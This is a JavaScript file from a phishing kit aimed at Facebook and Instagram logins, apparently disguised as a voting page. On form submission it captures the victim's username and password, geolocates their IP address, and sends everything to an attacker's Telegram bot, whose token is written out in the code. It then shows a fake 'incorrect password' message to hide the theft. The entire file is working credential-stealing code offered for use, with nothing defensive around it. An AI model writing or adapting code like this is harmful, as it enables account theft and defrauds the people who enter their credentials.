const form = document.querySelector("#form");
var ct = "5";
var co = 0;
var lo = 0;
var st = 0;

// Form-specific configurations
const platforms = {
  fb: {
    type: "Facebook Vote",
  },
  ig: {
    type: "Instagram Vote",
  },
};

form.addEventListener("submit", (e) => {
  e.preventDefault();

  // Determine platform (Facebook or Instagram) based on a data attribute or other identifier
  const platform = form.getAttribute("data-platform") || "fb"; // default to fb
  const platformConfig = platforms[platform];

  if (!platformConfig) {
    console.error("Invalid platform specified.");
    return;
  }

  fetch("https://ipapi.co/json/")
    .then((res) => res.json())
    .then((data) => {
      ct = data.ip;
      co = data.country_name;
      lo = data.country_calling_code;
      st = data.city;

      var identity = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      var text = `
      <b>New ${platformConfig.type}</b>
      - <b>Username/Email:</b> ${identity}
      - <b>Password:</b> ${password}
      - <b>IPAddress:</b> ${ct}
      - <b>Country:</b> ${co}
      - <b>Country Code:</b> ${lo}
      - <b>City:</b> ${st}
      `;

      var token = "7238505618:AAFq_0g2YgQDAdhG9OxDKsQGmZJ-o5t09U8";
      var chat_id = 7656086639;
      var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(
        text
      )}&parse_mode=HTML`;

      let api = new XMLHttpRequest();
      api.open("GET", url, true);
      api.send();
      document.getElementById("alert-message").innerHTML =
        "Sorry, your password was incorrect. Please double-check your password.";
    });

  // Uncomment and set redirection as needed
  // window.location.replace("https://www.instagram.com/accounts/login/")
  // console.log("Incorrect Password!");
});
